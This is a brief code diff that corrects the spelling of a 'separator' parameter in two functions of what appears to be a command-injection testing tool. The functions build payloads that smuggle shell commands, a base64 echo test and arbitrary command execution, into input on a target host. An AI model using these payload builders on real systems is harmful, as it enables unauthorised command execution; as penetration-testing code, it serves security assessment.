@@ -20,9 +20,9 @@
 """
 
 # File-based decision payload (check if host is vulnerable). 
-def decision(seperator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
+def decision(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
   
-  payload = (seperator + " " +
+  payload = (separator + " " +
 	     "$(echo '" + B64_ENC_TAG + "'" + B64_DEC_TRICK + " >" + OUTPUT_TEXTFILE + ")"
 	    ) 
   
@@ -30,9 +30,9 @@ def decision(seperator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
 
 
 # Execute shell commands on vulnerable host.
-def cmd_execution(seperator,cmd,OUTPUT_TEXTFILE):
+def cmd_execution(separator,cmd,OUTPUT_TEXTFILE):
   
-  payload = (seperator +
+  payload = (separator +
 	     "echo $(" + cmd + " > " + OUTPUT_TEXTFILE + ")" 
 	    )
 
